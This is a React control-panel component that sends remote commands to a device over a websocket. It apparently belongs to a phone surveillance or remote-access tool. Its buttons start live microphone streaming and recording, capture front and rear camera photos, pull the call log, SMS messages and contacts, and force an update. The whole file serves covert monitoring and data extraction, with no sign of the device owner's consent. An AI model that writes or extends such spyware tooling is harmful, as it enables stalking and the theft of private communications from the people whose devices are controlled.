'use client';

import type { Device } from '@/types';

interface ControlButtonsProps {
  device: Device;
  sendCommand: (deviceId: string, command: string, data?: any) => boolean;
  wsConnected: boolean;
}

export function ControlButtons({ device, sendCommand, wsConnected }: ControlButtonsProps) {
  const handleCommand = (command: string, data?: any) => {
    sendCommand(device.deviceId, command, data);
  };

  return (
    <div className="flex flex-wrap gap-1.5 mb-2.5">
      {/* Live Audio */}
      <button
        className={`btn-live ${device.isStreaming ? 'active' : ''}`}
        onClick={() => handleCommand(device.isStreaming ? 'stop_streaming' : 'start_streaming')}
        disabled={!wsConnected}
      >
        🎧 {device.isStreaming ? 'Stop' : 'Live'}
      </button>

      {/* Record */}
      <button
        className={device.isRecording ? 'btn-stop' : 'btn-rec'}
        onClick={() => handleCommand(device.isRecording ? 'stop_recording' : 'start_recording')}
        disabled={!wsConnected}
      >
        {device.isRecording ? '⏹ Stop' : '⏺ Record'}
      </button>

      {/* RTC */}
      <button
        className={`btn-rtc ${device.rtcActive ? 'active' : ''}`}
        onClick={() => handleCommand(device.rtcActive ? 'stop_rtc' : 'start_rtc')}
        disabled={!wsConnected}
      >
        📡 {device.rtcActive ? 'Stop RTC' : 'RTC'}
      </button>

      {/* Noise Suppression Toggle */}
      <button
        className="btn-ghost"
        onClick={() => handleCommand('toggle_noise_suppression')}
        disabled={!wsConnected}
      >
        🔇 NS {device.noiseSuppressionEnabled ? 'Off' : 'On'}
      </button>

      {/* Photo Capture */}
      <button
        className="btn-ghost"
        onClick={() => handleCommand('capture_photo', { camera: 'front' })}
        disabled={!wsConnected}
      >
        📷 Front
      </button>
      
      <button
        className="btn-ghost"
        onClick={() => handleCommand('capture_photo', { camera: 'rear' })}
        disabled={!wsConnected}
      >
        📷 Rear
      </button>

      {/* Request Data */}
      <button
        className="btn-ghost"
        onClick={() => handleCommand('request_call_log')}
        disabled={!wsConnected}
      >
        📞 Calls
      </button>

      <button
        className="btn-ghost"
        onClick={() => handleCommand('request_sms')}
        disabled={!wsConnected}
      >
        💬 SMS
      </button>

      <button
        className="btn-ghost"
        onClick={() => handleCommand('request_contacts')}
        disabled={!wsConnected}
      >
        📇 Contacts
      </button>

      {/* Force Update */}
      <button
        className="btn-danger"
        onClick={() => handleCommand('force_update')}
        disabled={!wsConnected}
      >
        🔄 Update
      </button>
    </div>
  );
}
